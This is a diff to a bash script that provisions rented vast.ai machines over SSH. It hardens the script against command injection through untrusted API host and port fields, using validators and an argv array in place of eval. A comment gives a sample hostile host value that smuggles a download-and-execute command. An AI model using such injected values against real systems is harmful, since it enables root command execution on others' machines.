@@ -671,9 +671,36 @@ trap 'warn "interrupted"; exit 130' INT TERM
 # ssh helpers
 # ---------------------------------------------------------------------------
 SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR"
+
+# EVERY vast.ai API FIELD IS UNTRUSTED INPUT.
+#
+# `public_ipaddr`, `ssh_host` and the port come out of a marketplace API whose
+# values a host operator influences.  They used to be interpolated straight into
+# the ssh command string that rsh_t runs through `eval`, which made a host that
+# advertised itself as `1.2.3.4; curl x|sh` arbitrary root command execution ON
+# THE COORDINATOR -- the machine running the sweep, not the rented box.
+#
+# Two independent defences, because this one is worth two:
+#   1. reject the value here, at the source, before it reaches any command; and
+#   2. build an ARGV ARRAY rather than a string, so nothing re-parses it later.
+# Either alone would do. Neither is allowed to be the only one.
+sweep_valid_host() {   # IPv4/IPv6 literal or DNS name, nothing else
+    case "$1" in
+        ''|*[!0-9A-Za-z.:_-]*) return 1 ;;
+        -*) return 1 ;;                    # cannot be mistaken for an ssh option
+        *) return 0 ;;
+    esac
+}
+sweep_valid_port() {
+    case "$1" in
+        ''|*[!0-9]*) return 1 ;;
+        *) [ "$1" -ge 1 ] && [ "$1" -le 65535 ] ;;
+    esac
+}
 SSH=""
 SCP_HOST=""
 SCP_PORT=""
+SSH_ARGV=()
 BOX_VIRT=""
 BOX_KVM=""
 PROVISION_FAILED_STEP=""
@@ -690,18 +717,22 @@ PROVISION_FAILED_STEP=""
 # came up must never be able to turn into a destructive local command.
 rsh_t() {
     local tmo="$1"; shift
-    if [ -z "${SSH:-}" ]; then
+    if [ "${#SSH_ARGV[@]}" -eq 0 ]; then
         warn "rsh_t: no ssh target set -- REFUSING to run remotely-intended command locally: ${1:0:60}"
         return 97
     fi
-    local q; q=$(printf '%q' "$1")
     # `< /dev/null` IS LOAD-BEARING.  ssh reads stdin, and these run inside
     # `while IFS=... read ... done <<< "$todo"` loops -- so without it the first
     # ssh SWALLOWS THE REST OF THE DRIVER LIST and the box quietly tests one
     # driver instead of six, reporting success for a sweep that never happened.
     # That is precisely the silent-undercoverage failure this script exists to
     # prevent, so it is spelled out rather than left as a habit.
-    eval "timeout $tmo $SSH $q" < /dev/null
+    # NO eval.  The command is passed as ONE argv element, which is exactly what
+    # the old `printf %q` + eval pair reconstructed -- ssh sends it verbatim and
+    # the REMOTE shell parses it, which is the intended semantics.  Removing the
+    # local eval removes the only place a hostile endpoint string could become
+    # local code.
+    timeout "$tmo" "${SSH_ARGV[@]}" "$1" < /dev/null
 }
 
 # ---------------------------------------------------------------------------
@@ -888,7 +919,15 @@ wait_for_box() {
                         "root@$host" 'echo NVKVM_SSH_OK' 2>/dev/null)"
                 case "$out" in
                     *NVKVM_SSH_OK*)
+                        if ! sweep_valid_host "$host" || ! sweep_valid_port "$port"; then
+                            warn "REFUSING endpoint from the vast API: host='$host' port='$port'"
+                            warn "  These fields are attacker-influenceable and are used to build"
+                            warn "  commands that run as root here. Skipping this endpoint."
+                            continue
+                        fi
                         CUR_HOST="$host"; CUR_PORT="$port"
+                        # shellcheck disable=SC2206  # SSH_OPTS is a fixed local literal
+                        SSH_ARGV=(ssh $SSH_OPTS -o ConnectTimeout=20 -p "$port" "root@$host")
                         SSH="ssh $SSH_OPTS -o ConnectTimeout=20 -p $port root@$host"
                         SCP_HOST="$host"; SCP_PORT="$port"
                         info "  ssh up: root@$host:$port"
